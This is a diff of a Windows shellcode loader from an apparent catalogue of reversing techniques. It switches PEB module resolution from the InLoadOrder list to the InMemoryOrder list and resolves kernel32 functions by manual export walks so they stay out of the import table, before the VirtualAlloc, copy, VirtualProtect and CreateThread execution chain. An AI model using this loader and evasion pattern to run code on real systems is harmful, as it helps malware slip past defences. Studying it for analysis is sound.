@@ -2,23 +2,23 @@
     Shellcode Loader
     Archive of Reversing.ID
 
-    Resolve module by walking PEB InLoadOrderModuleList.
+    Resolve module by walking PEB InMemoryOrderModuleList.
     Functions are then resolved via manual PE export walk by name.
 
 Compile:
     $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp
 
 Technique:
-    - access:       peb-walk InLoadOrder (module resolution)
+    - access:       module-enumeration InMemoryOrder (module resolution)
     - allocation:   VirtualAlloc
     - writing:      RtlMoveMemory
     - permission:   VirtualProtect
     - execution:    CreateThread
 
 Note:
-    - resolve_module: walk PEB->Ldr->InLoadOrderModuleList and match BaseDllName.
+    - resolve_module: walk PEB->Ldr->InMemoryOrderModuleList and match BaseDllName.
     - resolve_name: manual export walk by name (see dynamic-load/manual-name).
-    - other PEB list orders: see access/peb-walk/
+    - other PEB list orders: see access/module-enumeration/
 */
 
 #include <windows.h>
@@ -109,7 +109,7 @@ static BOOL name_equal (const char * a, const char * b)
 /*
     Resolve the module by name.
 
-    Walk PEB->Ldr->InLoadOrderModuleList and return DllBase of the
+    Walk PEB->Ldr->InMemoryOrderModuleList and return DllBase of the
     module whose BaseDllName matches target_dll.
 
     Args:
@@ -131,12 +131,12 @@ static PVOID resolve_module (const wchar_t * target_dll)
     ldr = *(PMY_PEB_LDR_DATA *) (__readfsdword (0x30) + 0x0C);
 #endif
 
-    list  = &ldr->InLoadOrderModuleList;
+    list  = &ldr->InMemoryOrderModuleList;
     entry = list->Flink;
 
     while (entry != list)
     {
-        PMY_LDR_ENTRY mod = CONTAINING_RECORD (entry, MY_LDR_ENTRY, InLoadOrderLinks);
+        PMY_LDR_ENTRY mod = CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks);
 
         if (mod->DllBase != NULL && mod->BaseDllName.Buffer != NULL)
         {
@@ -213,7 +213,7 @@ int main ()
 
     PVOID kernel32;
 
-    // resolve module base via PEB InLoadOrder walk, then each function by export name
+    // resolve module base via PEB InMemoryOrder walk, then each function by export name
     kernel32               = resolve_module (L"kernel32.dll");
     fn_VirtualAlloc        = (pVirtualAlloc)        resolve_name (kernel32, "VirtualAlloc");
     fn_VirtualProtect      = (pVirtualProtect)      resolve_name (kernel32, "VirtualProtect");
